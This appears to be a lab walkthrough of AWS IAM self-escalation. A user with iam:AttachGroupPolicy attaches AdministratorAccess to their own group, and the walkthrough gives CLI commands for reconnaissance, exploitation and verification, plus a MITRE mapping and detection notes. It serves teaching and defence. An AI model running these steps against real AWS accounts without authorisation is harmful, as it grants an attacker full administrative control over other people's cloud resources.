# Guided Walkthrough: Self-Escalation via iam:AttachGroupPolicy

This scenario demonstrates a privilege escalation vulnerability where an IAM user has permission to attach managed policies to a group they are a member of. The attacker can use `iam:AttachGroupPolicy` to attach the `AdministratorAccess` managed policy to their own group, thereby gaining administrator access through group membership.

This technique is subtle because the user never modifies their own user policies or role permissions directly. Instead, they target a group — a shared object — and rely on the existing group membership relationship to inherit the elevated permissions. In real environments this configuration appears when developers are granted broad IAM administration rights without restricting the scope to specific resources or groups.

The MITRE ATT&CK framework maps this to T1098 (Account Manipulation) because the attacker is modifying an account object (the group's policy attachments) to gain persistent elevated access. The escalation is immediate: once `AttachGroupPolicy` succeeds, all group members — including the attacker — inherit the new permissions with no additional steps required.

## The Challenge

You start as `pl-prod-iam-010-to-admin-starting-user`, an IAM user with a single notable permission: `iam:AttachGroupPolicy`. You are also a member of `pl-prod-iam-010-to-admin-group`, which currently has no administrative policies attached.

Your goal is to escalate to administrator access. You cannot modify your own user policies directly, but you can modify the group you belong to.

## Reconnaissance

First, confirm your identity and understand what you are working with:

```bash
aws iam get-user
aws sts get-caller-identity
```

Next, enumerate the groups your user belongs to:

```bash
aws iam list-groups-for-user --user-name pl-prod-iam-010-to-admin-starting-user
```

You will see `pl-prod-iam-010-to-admin-group` in the output. Now check what policies are currently attached to it:

```bash
aws iam list-attached-group-policies --group-name pl-prod-iam-010-to-admin-group
```

The group has no administrative policies yet. Your permission to attach policies to this group is the escalation vector.

## Exploitation

Attach the AWS-managed `AdministratorAccess` policy to the group:

```bash
aws iam attach-group-policy \
  --group-name pl-prod-iam-010-to-admin-group \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Because you are already a member of the group, this single API call is all that is required. IAM propagates the policy attachment to all group members immediately.

## Verification

Confirm the escalation worked by calling an API that requires administrator access:

```bash
aws iam list-users
```

If the call succeeds and returns a list of IAM users, you now have administrator access. You can also verify the policy is attached to the group:

```bash
aws iam list-attached-group-policies --group-name pl-prod-iam-010-to-admin-group
```

## What Happened

You exploited a self-escalation path that required only one API call. The key insight is that `iam:AttachGroupPolicy` on a group you belong to is functionally equivalent to granting yourself any policy — you are modifying a shared object that feeds back into your own effective permissions.

In real AWS environments, this configuration commonly appears when security teams grant "IAM administrator" rights that are scoped to specific actions but not to specific resources. Without a `Condition` block restricting which groups can receive policy attachments, any user with this permission who is also a group member can escalate themselves to administrator silently and instantly. IAM Access Analyzer and CSPM tools that enumerate privilege escalation paths will flag this combination.
